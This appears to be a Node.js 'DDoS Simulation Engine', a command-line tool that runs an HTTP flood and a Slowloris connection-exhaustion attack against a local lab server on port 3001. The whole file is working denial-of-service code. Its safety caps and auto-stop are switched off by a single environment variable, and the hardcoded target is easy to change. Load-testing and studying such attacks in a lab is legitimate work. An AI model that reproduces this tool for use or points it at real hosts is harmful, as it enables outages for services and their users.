const axios = require('axios');
const http = require('http');

const TARGET_URL = 'http://localhost:3001/api/data';
let attackInterval = null;
let autoStopTimeout = null;
let activeConnections = [];

// Safety defaults for local lab use. These can be overridden with env vars.
const SAFE_MODE = process.env.SIM_SAFE_MODE !== 'false';
const MAX_HTTP_INTENSITY = parseInt(process.env.SIM_MAX_HTTP_INTENSITY, 10) || 10;
const MAX_SLOWLORIS_CONNECTIONS = parseInt(process.env.SIM_MAX_SLOWLORIS_CONNECTIONS, 10) || 40;
const MAX_ATTACK_DURATION_MS = parseInt(process.env.SIM_MAX_ATTACK_DURATION_MS, 10) || 30000;

const modes = {
    HTTP_FLOOD: 'HTTP_FLOOD',
    SLOWLORIS: 'SLOWLORIS',
    IDLE: 'IDLE'
};

let currentMode = modes.IDLE;

function parsePositiveInt(raw, fallback) {
    const value = parseInt(raw, 10);
    return Number.isFinite(value) && value > 0 ? value : fallback;
}

function enforceLimit(value, maxLimit, label) {
    if (!SAFE_MODE) return value;
    if (value > maxLimit) {
        console.log(`[SAFE MODE] ${label} capped from ${value} to ${maxLimit}`);
        return maxLimit;
    }
    return value;
}

function armAutoStop() {
    if (!SAFE_MODE) return;
    if (autoStopTimeout) clearTimeout(autoStopTimeout);
    autoStopTimeout = setTimeout(() => {
        console.log(`[SAFE MODE] Auto-stopping attack after ${MAX_ATTACK_DURATION_MS / 1000}s`);
        stopAttack();
    }, MAX_ATTACK_DURATION_MS);
}

async function httpFlood(intensity) {
    const safeIntensity = enforceLimit(parsePositiveInt(intensity, 10), MAX_HTTP_INTENSITY, 'HTTP intensity');
    console.log(`[ATTACK] Starting HTTP Flood - Intensity: ${intensity} requests/batch`);
    currentMode = modes.HTTP_FLOOD;
    attackInterval = setInterval(async () => {
        const batch = [];
        for (let i = 0; i < safeIntensity; i++) {
            batch.push(axios.get(TARGET_URL).catch(e => {
                // Ignore errors (expected during DDoS)
            }));
        }
        await Promise.all(batch);
    }, 100); // Send 10 batches per second
    armAutoStop();
}

function slowloris(count) {
    const safeCount = enforceLimit(parsePositiveInt(count, 20), MAX_SLOWLORIS_CONNECTIONS, 'Slowloris connections');
    console.log(`[ATTACK] Starting Slowloris - Opening ${count} slow connections`);
    currentMode = modes.SLOWLORIS;
    for (let i = 0; i < safeCount; i++) {
        const options = {
            hostname: 'localhost',
            port: 3001,
            path: '/',
            method: 'GET',
            headers: {
                'Content-Length': '100000',
                'Connection': 'keep-alive'
            }
        };

        const req = http.request(options, (res) => {});
        req.on('error', (e) => {});
        
        // Send a byte every 5 seconds to keep connection open
        const interval = setInterval(() => {
            if (req.writable) {
                req.write('a');
            } else {
                clearInterval(interval);
            }
        }, 5000);

        activeConnections.push({ req, interval });
    }
    armAutoStop();
}

function stopAttack() {
    if (attackInterval) clearInterval(attackInterval);
    if (autoStopTimeout) clearTimeout(autoStopTimeout);
    attackInterval = null;
    autoStopTimeout = null;
    activeConnections.forEach(c => {
        clearInterval(c.interval);
        c.req.destroy();
    });
    activeConnections = [];
    currentMode = modes.IDLE;
    console.log('[SYSTEM] Attack Stopped.');
}

// Simple CLI Interface
const readline = require('readline');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function showMenu() {
    console.log('\n--- DDoS Simulation Engine ---');
    console.log('1. Launch HTTP Flood (Volumetric)');
    console.log('2. Launch Slowloris (Connection Exhaustion)');
    console.log('3. Stop All Activity');
    console.log('4. Exit');
    rl.question('Select an option: ', handleMenu);
}

function handleMenu(choice) {
    switch (choice) {
        case '1':
            stopAttack();
            rl.question('Enter intensity (requests per batch, e.g., 50): ', (num) => {
                httpFlood(parseInt(num) || 50);
                showMenu();
            });
            break;
        case '2':
            stopAttack();
            rl.question('Enter connection count (e.g., 200): ', (num) => {
                slowloris(parseInt(num) || 200);
                showMenu();
            });
            break;
        case '3':
            stopAttack();
            showMenu();
            break;
        case '4':
            stopAttack();
            process.exit(0);
            break;
        default:
            console.log('Invalid choice');
            showMenu();
    }
}

console.log('DDoS Simulator Engine Ready.');
if (SAFE_MODE) {
    console.log(`[SAFE MODE] Enabled (max HTTP intensity: ${MAX_HTTP_INTENSITY}, max Slowloris connections: ${MAX_SLOWLORIS_CONNECTIONS}, auto-stop: ${MAX_ATTACK_DURATION_MS / 1000}s)`);
} else {
    console.log('[SAFE MODE] Disabled via SIM_SAFE_MODE=false');
}
showMenu();
